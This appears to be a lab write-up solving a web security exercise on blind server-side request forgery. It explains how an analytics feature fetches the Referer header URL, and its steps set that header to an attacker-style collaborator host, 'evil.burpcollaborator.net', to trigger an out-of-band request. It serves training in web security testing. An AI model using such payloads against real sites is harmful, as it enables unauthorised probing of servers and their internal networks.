### Lab: Blind SSRF with out-of-band detection

This site uses analytics software which fetches the URL specified in the Referer header when a product page is loaded.

To solve the lab, use this functionality to cause an HTTP request to the public Burp Collaborator server.

_____

Analysis and Exploit:

1. Intercept request for GET **/product?productId=1**
    - **[BURP-REPEATER]** Modify the **Referer header** to be something like http:// evil.burpcollaborator.net and send request

From https://book.hacktricks.xyz/pentesting-web/ssrf-server-side-request-forgery

`Some applications employ server-side analytics software that tracks visitors. This software often logs the Referrer header in requests, since this is of particular interest for tracking incoming links. Often the analytics software will actually visit any third-party URL that appears in the Referrer header. This is typically done to analyze the contents of referring sites, including the anchor text that is used in the incoming links. As a result, the Referer header often represents fruitful attack surface for SSRF vulnerabilities.
To discover this kind of "hidden" vulnerabilities you could use the plugin "Collaborator Everywhere" from Burp.`

_____

Script:

1. Request page with the 'hacked' Referer header | GET **/product?productId=1** | header: referer
    - referer : http://evil.burpcollaborator.net
    - if response status code 200, then ok
